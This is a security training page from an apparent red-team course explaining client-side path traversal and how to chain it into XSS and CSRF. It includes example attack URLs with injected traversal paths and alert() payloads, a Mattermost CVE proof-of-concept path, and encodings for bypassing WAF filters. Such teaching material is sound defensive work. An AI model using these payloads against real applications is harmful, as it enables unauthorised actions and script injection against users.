---
layout: training-page
title: "Client Side Path Traversal — Red Team Academy"
module: "Web Hacking"
tags:
  - cspt
  - csrf
  - xss
  - path-traversal
  - web
page_key: "web-client-side-path-traversal"
render_with_liquid: false
---

# Client Side Path Traversal

Client-Side Path Traversal (CSPT), also called "On-site Request Forgery," is a vulnerability where an application's front-end JavaScript constructs a `fetch` or XHR URL using user-controlled input without proper path encoding. By injecting `../` sequences, an attacker redirects the request to an arbitrary endpoint on the same origin. Because the request originates from the victim's browser, it automatically carries the victim's cookies and authentication headers — bypassing same-site cookie restrictions and anti-CSRF token validation.

## How CSPT Works

A page takes a user-controlled value (from a query parameter, hash, or path segment) and places it directly into a `fetch` call:

```
// Vulnerable code on the page
const newsId = new URLSearchParams(window.location.search).get('newsitemid');
fetch('/newitems/' + newsId);  // newsitemid is not sanitized
```

By injecting `../` sequences into `newsitemid`, the browser normalizes the path and sends the request to a different endpoint:

```
# Original request
GET /newitems/123

# With path traversal injection
GET /newitems/../pricing/default.js?cb=alert(1)
# Normalized by browser to:
GET /pricing/default.js?cb=alert(1)
```

## CSPT to XSS

CSPT becomes XSS when the response from the traversed endpoint is reflected into the DOM without sanitization. The attacker chains a CSPT source (the traversable parameter) with an XSS sink (an endpoint that reflects its input).

**Real example:**

```
# Source page fetches content based on newsitemid parameter
https://example.com/static/cms/news.html?newsitemid=<id>

# Sink: text injection at /pricing/default.js via cb parameter
https://example.com/pricing/default.js?cb=alert(document.domain)//

# CSPT payload combining both — inject ../pricing/default.js path and XSS payload
https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
```

## CSPT to CSRF (CSPT2CSRF)

CSPT can bypass CSRF defenses because the fetch is initiated by the legitimate application front-end. The browser attaches CSRF tokens and SameSite cookies automatically. This enables CSRF-equivalent impact against endpoints that would normally be protected.

| Capability | Classic CSRF | CSPT2CSRF |
| --- | --- | --- |
| POST CSRF | Yes | Yes |
| Control the request body | Yes | No |
| Works with anti-CSRF token | No | Yes |
| Works with SameSite=Lax | No | Yes |
| GET / PATCH / PUT / DELETE | No | Yes |
| 1-click attack | No | Yes |

### Real-World CSPT2CSRF Examples

```
# CVE-2023-45316 — Mattermost POST sink
/<team>/channels/channelname?telem_action=under_control&forceRHSOpen\
&telem_run_id=../../../../../../api/v4/caches/invalidate

# CSPT to cancel a resource (GET sink)
https://example.com/signup/invite?email=foo%40bar.com\
&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=
```

## Discovery Methodology

CSPT sources are parameters that end up in a URL path component of a client-side HTTP request. Look for:

- Query parameters that get placed in fetch/XHR URLs: `id=`, `page=`, `path=`, `resource=`
- Hash fragments used to build API calls
- Path segments extracted with `location.pathname` and passed to fetch

CSPT sinks are endpoints that produce exploitable responses when traversed to:

- Endpoints that reflect input into the response (XSS sinks)
- State-changing API endpoints that accept GET, POST, PATCH, DELETE (CSRF sinks)

### Burp Extension — Automated Discovery

```
# Install the CSPTBurpExtension from the BApp Store
# It passively monitors traffic and flags parameters injected into fetch URLs
# Also supports active scanning with ../  payloads
```

### WAF Bypass via Encoding

WAFs that filter raw `../` may miss encoded variants:

```
# Double URL encode
..%2F
%2E%2E%2F
%2E%2E/
..%252F  (double encoded %25 = %)

# Bypass with extra slashes
....//  (resolved to ../ by some normalizers)
```

## Tools

- [doyensec/CSPTBurpExtension](https://github.com/doyensec/CSPTBurpExtension) — Burp Suite extension to find and exploit CSPT
- [doyensec/CSPTPlayground](https://github.com/doyensec/CSPTPlayground) — Open-source lab environment for CSPT practice

## Resources

- Exploiting CSPT to Perform CSRF — Introducing CSPT2CSRF — Maxence Schmitt — `blog.doyensec.com/2024/07/02/cspt2csrf.html`
- CSPT2CSRF Whitepaper — Maxence Schmitt — `doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf`
- On-Site Request Forgery — Dafydd Stuttard — `portswigger.net/blog/on-site-request-forgery`
- Bypassing WAFs to Exploit CSPT Using Encoding Levels — Matan Berson — `matanber.com/blog/cspt-levels`
- Leaking Jupyter Auth Token via CSPT Chaining — Davwwwx — `blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/`
- Bypassing File Upload Restrictions to Exploit CSPT — Maxence Schmitt — `blog.doyensec.com/2025/01/09/cspt-file-upload.html`
